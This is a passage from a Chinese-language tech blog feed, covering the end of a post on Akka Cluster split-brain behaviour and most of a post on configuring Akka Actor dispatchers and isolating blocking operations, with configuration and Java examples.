gossip，直至收敛，确认新的leader，被隔开的那部分节点会被认为是unreachable而最终被踢掉</p></li><li><p>被隔开的那部分节点，会重新发起biased gossip，其中排序在最前面的种子节点会创建一个新的集群，并产生新的leader。原集群中的那部分失联节点会被认为是unreachable而最终被从新集群踢掉</p></li><li><p>两个集群最终都恢复正常能对外提供服务，即原来的一个集群在无人干涉的情况下，分裂成了两个集群</p></li><li><p>当网络恢复后，两个集群会重新发起biased gossip，尝试融合，恢复成一个大集群。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>由此可见，从设计上来说，Akka Cluster是完全去中心化，无单点故障和单点性能瓶颈的，具有天然的分布式容错性和可扩容性。<br>​</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://edisonxu.com/2018/11/07/akka-cluster.html">http://edisonxu.com/2018/11/07/akka-cluster.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; Akka remoting是Peer-to-Peer的，所以基于remote功能的cluster是一个</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-调度器</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E8%B0%83%E5%BA%A6%E5%99%A8/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E8%B0%83%E5%BA%A6%E5%99%A8/</id>
    <published>2021-12-03T07:50:01.756Z</published>
    <updated>2021-12-03T09:07:15.160Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-依赖"><a href="#1-依赖" class="headerlink" title="1.依赖"></a>1.依赖</h2><pre><code>调度器（Dispatchers）是 Akka 核心的一部分，这意味着它们也是akka-actor依赖的一部分：</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Maven --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;akka-actor_2.12&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;2.5.21&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Gradle --&gt;</span><br><span class="line">dependencies &#123;</span><br><span class="line">  compile group: &#x27;com.typesafe.akka&#x27;, name: &#x27;akka-actor_2.12&#x27;, version: &#x27;2.5.21&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- sbt --&gt;</span><br><span class="line">libraryDependencies += &quot;com.typesafe.akka&quot; %% &quot;akka-actor&quot; % &quot;2.5.21&quot;</span><br></pre></td></tr></table></figure><h2 id="2-简介"><a href="#2-简介" class="headerlink" title="2.简介"></a>2.简介</h2><pre><code>  正如在「[Actor System](https://doc.akka.io/docs/akka/current/general/actor-systems.html)」中所解释的，每个 Actor 都是其子级的监督者，因此每个 Actor 定义了故障处理的监督策略。这一策略不能在 Actor 系统启动之后改变，因为它是 Actor 系统结构的一个组成部分。</code></pre><p>Akka 的MessageDispatcher是 Akka Actor “tick”的原因，可以说，它是机器的引擎。所有MessageDispatcher实现也是一个ExecutionContext，这意味着它们可以用于执行任意代码，例如「<a href="https://doc.akka.io/docs/akka/current/futures.html">Futures</a>」。<br>​</p><h2 id="3-默认调度器"><a href="#3-默认调度器" class="headerlink" title="3.默认调度器"></a>3.默认调度器</h2><pre><code> 每个ActorSystem都将有一个默认的调度器，在没有为 Actor 配置其他内容的情况下使用该调度器。可以配置默认调度器，默认情况下是具有指定default-executor的Dispatcher。如果在传入ExecutionContext的情况下创建ActorSystem，则此ExecutionContext将用作此ActorSystem中所有调度程序的默认执行器。如果没有给定ExecutionContext，它将回退到在akka.actor.default-dispatcher.default-executor.fallback中指定的执行器。默认情况下，这是一个“fork-join-executor”，在大多数情况下，它提供了出色的性能。</code></pre><p>​</p><h2 id="4-查找调度器"><a href="#4-查找调度器" class="headerlink" title="4. 查找调度器"></a>4. 查找调度器</h2><p>调度器实现ExecutionContext接口，因此可以用于运行Future的调用等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// this is scala.concurrent.ExecutionContext</span><br><span class="line">// for use with Futures, Scheduler, etc.</span><br><span class="line">final ExecutionContext ex = system.dispatchers().lookup(&quot;my-dispatcher&quot;);</span><br></pre></td></tr></table></figure><h2 id="5-为-Actor-设置调度器"><a href="#5-为-Actor-设置调度器" class="headerlink" title="5. 为 Actor 设置调度器"></a>5. 为 Actor 设置调度器</h2><p>  如果你想给你的 Actor 一个不同于默认的调度器，你需要做两件事，第一件事是配置调度器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">my-dispatcher &#123;</span><br><span class="line">  # Dispatcher is the name of the event-based dispatcher</span><br><span class="line">  type = Dispatcher</span><br><span class="line">  # What kind of ExecutionService to use</span><br><span class="line">  executor = &quot;fork-join-executor&quot;</span><br><span class="line">  # Configuration for the fork join pool</span><br><span class="line">  fork-join-executor &#123;</span><br><span class="line">    # Min number of threads to cap factor-based parallelism number to</span><br><span class="line">    parallelism-min = 2</span><br><span class="line">    # Parallelism (threads) ... ceil(available processors * factor)</span><br><span class="line">    parallelism-factor = 2.0</span><br><span class="line">    # Max number of threads to cap factor-based parallelism number to</span><br><span class="line">    parallelism-max = 10</span><br><span class="line">  &#125;</span><br><span class="line">  # Throughput defines the maximum number of messages to be</span><br><span class="line">  # processed per actor before the thread jumps to the next actor.</span><br><span class="line">  # Set to 1 for as fair as possible.</span><br><span class="line">  throughput = 100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>注释</strong>：请注意，parallelism-max不会在ForkJoinPool分配的线程总数上设置上限。这是一个设置，专门讨论池保持运行的热线程数，以减少处理新的传入任务的延迟。你可以在 JDK 的「<a href="https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ForkJoinPool.html">ForkJoinPool 文档</a>」中了解更多关于并行性的信息。</li></ul><p>另一个使用“thread-pool-executor”的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blocking-io-dispatcher &#123;</span><br><span class="line">  type = Dispatcher</span><br><span class="line">  executor = &quot;thread-pool-executor&quot;</span><br><span class="line">  thread-pool-executor &#123;</span><br><span class="line">    fixed-pool-size = 32</span><br><span class="line">  &#125;</span><br><span class="line">  throughput = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>注释</strong>：线程池执行器调度程序由java.util.concurrent.ThreadPoolExecutor实现。你可以在 JDK 的「<a href="https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ThreadPoolExecutor.html">ThreadPoolExecutor 文档</a>」中了解更多关于它的信息。</li></ul><p>有关更多选项，请参阅「<a href="https://doc.akka.io/docs/akka/current/general/configuration.html">配置</a>」的默认调度器部分。<br>然后你就可以像往常一样创建 Actor，并在部署配置中定义调度器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActorRef myActor = system.actorOf(Props.create(MyActor.class), &quot;myactor&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">akka.actor.deployment &#123;</span><br><span class="line">  /myactor &#123;</span><br><span class="line">    dispatcher = my-dispatcher</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署配置的另一种选择是在代码中定义调度器。如果在部署配置中定义dispatcher，则将使用此值，而不是以编程方式提供的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActorRef myActor =</span><br><span class="line">    system.actorOf(Props.create(MyActor.class).withDispatcher(&quot;my-dispatcher&quot;), &quot;myactor3&quot;);</span><br></pre></td></tr></table></figure><ul><li><p><strong>注释</strong>：在withDispatcher中指定的调度器和部署配置中的dispatcher属性实际上是进入配置的路径。所以在这个例子中，它是一个顶级部分，但是你可以把它作为一个子部分，在这里你可以用句点来表示子部分，就像这样：foo.bar.my-dispatcher</p><h2 id="6-调度器类型"><a href="#6-调度器类型" class="headerlink" title="6.调度器类型"></a>6.调度器类型</h2><p>有 3 种不同类型的消息调度器：</p></li><li><p>Dispatcher:这是一个基于事件的调度程序,它将一组 Actor 绑定到线程池。如果未指定调度器,则使用默认调度器。 </p><ul><li>可共享性：Unlimited</li><li>邮箱：任意，为每个 Actor 创建一个</li><li>用例：默认调度器，Bulkheading</li><li>驱动：java.util.concurrent.ExecutorService。使用fork-join-executor、thread-pool-executor或akka.dispatcher.ExecutorServiceConfigurator的FQCN指定的executor。</li></ul></li><li><p>PinnedDispatcher：这个调度器为每个使用它的 Actor 指定唯一的线程；即每个 Actor 将拥有自己的线程池，池中只有一个线程。 </p><ul><li>可共享性：None</li><li>邮箱：任意，为每个 Actor 创建一个</li><li>用例：Bulkheading</li><li>驱动：任何akka.dispatch.ThreadPoolExecutorConfigurator。默认情况下为thread-pool-executor。</li></ul></li><li><p>CallingThreadDispatcher：此调度器仅在当前调用的线程上运行。这个调度器不创建任何新的线程，但是它可以从不同的线程并发地用于同一个 Actor。有关详细信息和限制，请参阅「<a href="https://doc.akka.io/docs/akka/current/testing.html#callingthreaddispatcher">CallingThreadDispatcher</a>」。 </p><ul><li>可共享性：Unlimited</li><li>邮箱：任意，为每个 Actor 创建一个（按需）</li><li>用例：Testing</li><li>驱动：调用线程（duh）<h2 id="7-更多调度器配置示例"><a href="#7-更多调度器配置示例" class="headerlink" title="7.更多调度器配置示例"></a>7.更多调度器配置示例</h2>配置具有固定线程池大小的调度器，例如，对于执行阻塞 IO 的 Actor：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blocking-io-dispatcher &#123;</span><br><span class="line">  type = Dispatcher</span><br><span class="line">  executor = &quot;thread-pool-executor&quot;</span><br><span class="line">  thread-pool-executor &#123;</span><br><span class="line">    fixed-pool-size = 32</span><br><span class="line">  &#125;</span><br><span class="line">  throughput = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>然后使用它：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActorRef myActor =</span><br><span class="line">    system.actorOf(Props.create(MyActor.class).withDispatcher(&quot;blocking-io-dispatcher&quot;));</span><br></pre></td></tr></table></figure>另一个基于核（cores）数量使用线程池的示例，例如，对于 CPU 绑定的任务：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">my-thread-pool-dispatcher &#123;</span><br><span class="line">  # Dispatcher is the name of the event-based dispatcher</span><br><span class="line">  type = Dispatcher</span><br><span class="line">  # What kind of ExecutionService to use</span><br><span class="line">  executor = &quot;thread-pool-executor&quot;</span><br><span class="line">  # Configuration for the thread pool</span><br><span class="line">  thread-pool-executor &#123;</span><br><span class="line">    # minimum number of threads to cap factor-based core number to</span><br><span class="line">    core-pool-size-min = 2</span><br><span class="line">    # No of core threads ... ceil(available processors * factor)</span><br><span class="line">    core-pool-size-factor = 2.0</span><br><span class="line">    # maximum number of threads to cap factor-based number to</span><br><span class="line">    core-pool-size-max = 10</span><br><span class="line">  &#125;</span><br><span class="line">  # Throughput defines the maximum number of messages to be</span><br><span class="line">  # processed per actor before the thread jumps to the next actor.</span><br><span class="line">  # Set to 1 for as fair as possible.</span><br><span class="line">  throughput = 100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在保持某些内部状态的 Actor 数量相对较少的情况下，使用关联池（affinity pool）的不同类型的调度器可能会增加吞吐量。关联池尽可能的确保 Actor 总是被安排在同一线程上运行。这个 Actor 到线程的连接（pinning）旨在增加 CPU 缓存命中率，这可能使吞吐量显著提高。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">affinity-pool-dispatcher &#123;</span><br><span class="line">  # Dispatcher is the name of the event-based dispatcher</span><br><span class="line">  type = Dispatcher</span><br><span class="line">  # What kind of ExecutionService to use</span><br><span class="line">  executor = &quot;affinity-pool-executor&quot;</span><br><span class="line">  # Configuration for the thread pool</span><br><span class="line">  affinity-pool-executor &#123;</span><br><span class="line">    # Min number of threads to cap factor-based parallelism number to</span><br><span class="line">    parallelism-min = 8</span><br><span class="line">    # Parallelism (threads) ... ceil(available processors * factor)</span><br><span class="line">    parallelism-factor = 1</span><br><span class="line">    # Max number of threads to cap factor-based parallelism number to</span><br><span class="line">    parallelism-max = 16</span><br><span class="line">  &#125;</span><br><span class="line">  # Throughput defines the maximum number of messages to be</span><br><span class="line">  # processed per actor before the thread jumps to the next actor.</span><br><span class="line">  # Set to 1 for as fair as possible.</span><br><span class="line">  throughput = 100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>配置一个PinnedDispatcher：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my-pinned-dispatcher &#123;</span><br><span class="line">  executor = &quot;thread-pool-executor&quot;</span><br><span class="line">  type = PinnedDispatcher</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>然后使用它：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ActorRef myActor =</span><br><span class="line">    system.actorOf(Props.create(MyActor.class).withDispatcher(&quot;my-pinned-dispatcher&quot;));</span><br><span class="line"></span><br></pre></td></tr></table></figure>注意，根据上面的my-thread-pool-dispatcher示例，thread-pool-executor配置不适用（NOT applicable）。这是因为每个 Actor 在使用PinnedDispatcher时都有自己的线程池，而该池只有一个线程。<br>注意，不能保证随着时间的推移使用相同的线程，因为核心池超时用于PinnedDispatcher，以在空闲 Actor 的情况下保持资源使用率低。要始终使用同一线程，需要添加PinnedDispatcher的配置thread-pool-executor.allow-core-timeout=off。<br>​</li></ul></li></ul><h2 id="8-阻塞需要小心管理"><a href="#8-阻塞需要小心管理" class="headerlink" title="8.阻塞需要小心管理"></a>8.阻塞需要小心管理</h2><p>在某些情况下，不可避免地要执行阻塞操作，即让线程休眠一段不确定的时间，等待发生外部事件。例如，传统的 RDBMS 驱动程序或消息传递 API，其根本原因通常是（网络）I/O 发生在表面之下（occurs under the covers）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class BlockingActor extends AbstractActor &#123;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public Receive createReceive() &#123;</span><br><span class="line">    return receiveBuilder()</span><br><span class="line">        .match(</span><br><span class="line">            Integer.class,</span><br><span class="line">            i -&gt; &#123;</span><br><span class="line">              Thread.sleep(5000); // block for 5 seconds, representing blocking I/O, etc</span><br><span class="line">              System.out.println(&quot;Blocking operation finished: &quot; + i);</span><br><span class="line">            &#125;)</span><br><span class="line">        .build();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>面对这种情况，你可能会试图将阻塞调用包装在Future，并改为使用它，但这种策略过于简单：当应用程序在增加的负载下运行时，很可能会发现瓶颈或内存或线程不足。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class BlockingFutureActor extends AbstractActor &#123;</span><br><span class="line">  ExecutionContext ec = getContext().getDispatcher();</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public Receive createReceive() &#123;</span><br><span class="line">    return receiveBuilder()</span><br><span class="line">        .match(</span><br><span class="line">            Integer.class,</span><br><span class="line">            i -&gt; &#123;</span><br><span class="line">              System.out.println(&quot;Calling blocking Future: &quot; + i);</span><br><span class="line">              Future&lt;Integer&gt; f =</span><br><span class="line">                  Futures.future(</span><br><span class="line">                      () -&gt; &#123;</span><br><span class="line">                        Thread.sleep(5000);</span><br><span class="line">                        System.out.println(&quot;Blocking future finished: &quot; + i);</span><br><span class="line">                        return i;</span><br><span class="line">                      &#125;,</span><br><span class="line">                      ec);</span><br><span class="line">            &#125;)</span><br><span class="line">        .build();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-1-问题：在默认调度器上阻塞"><a href="#8-1-问题：在默认调度器上阻塞" class="headerlink" title="8.1 问题：在默认调度器上阻塞"></a>8.1 问题：在默认调度器上阻塞</h3><p>在这里，关键的一行是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecutionContext ec = getContext().getDispatcher();</span><br></pre></td></tr></table></figure><p>使用getContext().getDispatcher()作为调度器，在该调度器上阻塞Future的执行可能是一个问题，因为默认情况下，除非为 Actor 设置单独的调度器，否则此调度器也将用于所有其他 Actor。<br>如果所有可用的线程都被阻塞，那么同一调度器上的所有 Actor 都将因线程而发生饥饿，并且无法处理传入的消息。</p><ul><li><strong>注释</strong>：如果可能，还应避免阻塞 API。尝试寻找或构建Reactive API，以便将阻塞最小化，或者将其转移到专用的调度器。通常在与现有库或系统集成时，不可能避免阻塞 API，下面的解决方案解释了如何正确处理阻塞操作。请注意，同样的提示也适用于管理 Akka 中任何地方的阻塞操作，包括流、HTTP 和其他构建在其上的响应式库。</li></ul><p>让我们用上面的BlockingFutureActor和下面的PrintActor设置一个应用程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class PrintActor extends AbstractActor &#123;</span><br><span class="line">  @Override</span><br><span class="line">  public Receive createReceive() &#123;</span><br><span class="line">    return receiveBuilder()</span><br><span class="line">        .match(</span><br><span class="line">            Integer.class,</span><br><span class="line">            i -&gt; &#123;</span><br><span class="line">              System.out.println(&quot;PrintActor: &quot; + i);</span><br><span class="line">            &#125;)</span><br><span class="line">        .build();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ActorRef actor1 = system.actorOf(Props.create(BlockingFutureActor.class));</span><br><span class="line">ActorRef actor2 = system.actorOf(Props.create(PrintActor.class));</span><br><span class="line"></span><br><span class="line">for (int i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">  actor1.tell(i, ActorRef.noSender());</span><br><span class="line">  actor2.tell(i, ActorRef.noSender());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，应用程序向BlockingFutureActor和PrintActor发送 100 条消息，大量akka.actor.default-dispatcher线程正在处理请求。当你运行上述代码时，很可能会看到整个应用程序被卡在如下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;　PrintActor: 44</span><br><span class="line">&gt;　PrintActor: 45</span><br></pre></td></tr></table></figure><p>PrintActor被认为是非阻塞的，但是它不能继续处理剩余的消息，因为所有线程都被另一个阻塞 Actor 占用和阻塞，从而导致线程不足。<br>在下面的螺纹状态图中，颜色具有以下含义：</p><ul><li>天蓝色 - 休眠状态</li><li>橙色 - 等待状态</li><li>绿色 - 运行状态</li></ul><p>线程信息是使用YourKit profiler记录的，但是任何好的 JVM profiler都有这个特性，包括免费的和与 Oracle JDK VisualVM 捆绑的，以及 Oracle Flight Recorder。<br>线程的橙色部分表示它处于空闲状态。空闲线程很好，它们准备接受新的工作。然而，大量的天蓝色（阻塞，或者像我们的例子中那样休眠）线程是非常糟糕的，会导致线程饥饿。</p><ul><li><strong>注释</strong>：如果你订阅了 LightBend 的商业服务，你可以使用「<a href="https://developer.lightbend.com/docs/akka-commercial-addons/current/starvation-detector.html">线程饥饿检测器</a>」，如果它检测到你的任何调度程序有饥饿和其他问题，它将发出警告日志语句。这是识别生产系统中发生的问题的有用步骤，然后你可以应用下面解释的建议解决方案。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1638285321734-6c025b01-eee7-48df-bff2-19c82abde45e.png#clientId=uc750018c-c2cd-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=151&id=u72ec2b27&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118031&status=done&style=none&taskId=u95263b21-d346-4482-a6c9-c777d0bd6ff&title=&width=401" alt="image.png"><br>在上面的示例中，我们通过向阻塞 Actor 发送数百条消息来加载代码，这会导致默认调度器的线程被阻塞。然后，Akka 中基于fork join池的调度器尝试通过向池中添加更多线程来补偿此阻塞（default-akka.actor.default-dispatcher 18,19,20,…）。但是，如果这些操作会立即被阻塞，并且最终阻塞操作将主宰整个调度器，那么这将无济于事。<br>实质上，Thread.sleep操作控制了所有线程，并导致在默认调度器上执行的任何操作都需要资源，包括尚未为其配置显式调度器的任何 Actor。</p><h3 id="8-2-解决方案：用于阻塞操作的专用调度器"><a href="#8-2-解决方案：用于阻塞操作的专用调度器" class="headerlink" title="8.2 解决方案：用于阻塞操作的专用调度器"></a>8.2 解决方案：用于阻塞操作的专用调度器</h3><p>隔离阻塞行为以使其不影响系统其余部分的最有效方法之一是，为所有这些阻塞操作准备和使用专用调度器。这种技术通常被称为“bulk-heading”或简单的“isolating blocking”。<br>在application.conf中，专门用于阻塞行为的调度器应配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my-blocking-dispatcher &#123;</span><br><span class="line">  type = Dispatcher</span><br><span class="line">  executor = &quot;thread-pool-executor&quot;</span><br><span class="line">  thread-pool-executor &#123;</span><br><span class="line">    fixed-pool-size = 16</span><br><span class="line">  &#125;</span><br><span class="line">  throughput = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于thread-pool-executor的调度器允许我们对它将承载的线程数设置限制，这样我们就可以严格控制系统中最多有多少被阻塞的线程。<br>具体的大小应该根据你期望在此调度器上运行的工作负载以及运行应用程序的计算机的核数量（number of cores）进行微调。通常，核数周围的小数字是一个很好的默认值。<br>每当需要进行阻塞时，使用上面配置的调度器而不是默认调度程序：<br>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class SeparateDispatcherFutureActor extends AbstractActor &#123;</span><br><span class="line">  ExecutionContext ec = getContext().getSystem().dispatchers().lookup(&quot;my-blocking-dispatcher&quot;);</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public Receive createReceive() &#123;</span><br><span class="line">    return receiveBuilder()</span><br><span class="line">        .match(</span><br><span class="line">            Integer.class,</span><br><span class="line">            i -&gt; &#123;</span><br><span class="line">              System.out.println(&quot;Calling blocking Future on separate dispatcher: &quot; + i);</span><br><span class="line">              Future&lt;Integer&gt; f =</span><br><span class="line">                  Futures.future(</span><br><span class="line">                      () -&gt; &#123;</span><br><span class="line">                        Thread.sleep(5000);</span><br><span class="line">                        System.out.println(&quot;Blocking future finished: &quot; + i);</span><br><span class="line">                        return i;</span><br><span class="line">                      &#125;,</span><br><span class="line">                      ec);</span><br><span class="line">            &#125;)</span><br><span class="line">        .build();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线程池行为如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1638285382292-6adbaa9f-52d4-4b6b-8a44-85ed51d9915d.png#clientId=uc750018c-c2cd-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=159&id=u8998c525&margin=%5Bobject%20Object%5D&name=image.png&originHeight=318&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127412&status=done&style=none&taskId=u30638a96-3a47-4552-8055-12c7fa362a7&title=&width=400.5" alt="image.png"><br>发送给SeparateDispatcherFutureActor和PrintActor的消息由默认调度器处理，绿线表示实际执行。<br>在my-blocking-dispatcher上运行阻塞操作时，它使用线程（达到配置的限制）来处理这些操作。在这种情况下，休眠与这个调度器很好地隔离开来，默认的调度器不受影响，允许应用程序的其余部分继续运行，就好像没有发生什么不好的事情一样。经过一段时间的空闲之后，由这个调度程序启动的线程将被关闭。<br>在这种情况下，其他 Actor 的吞吐量没有受到影响，它们仍然在默认调度器上工作。<br>这是处理响应式应用程序中任何类型的阻塞的推荐方法。<br>有关 Akka HTTP 的类似讨论，请参阅「<a href="https://doc.akka.io/docs/akka-http/current/handling-blocking-operations-in-akka-http-routes.html?language=java#handling-blocking-operations-in-akka-http">Handling blocking operations in Akka HTTP</a>」。</p><h3 id="8-3-阻止操作的可用解决方案"><a href="#8-3-阻止操作的可用解决方案" class="headerlink" title="8.3. 阻止操作的可用解决方案"></a>8.3. 阻止操作的可用解决方案</h3><p>针对“阻塞问题”的充分解决方案的非详尽清单包括以下建议：</p><ul><li>在由路由器管理的 Actor（或一组 Actor）内执行阻塞调用，确保配置专门用于此目的或足够大的线程池。</li><li>在Future上执行阻塞调用，确保在任何时间点对此类调用的数量上限，提交无限数量的此类任务将耗尽内存或线程限制。</li><li>在Future执行阻塞调用，为线程池提供一个线程数上限，该上限适用于运行应用程序的硬件，如本节中详细介绍的那样。</li><li>指定一个线程来管理一组阻塞资源（例如，驱动多个通道的 NIO 选择器），并在事件作为 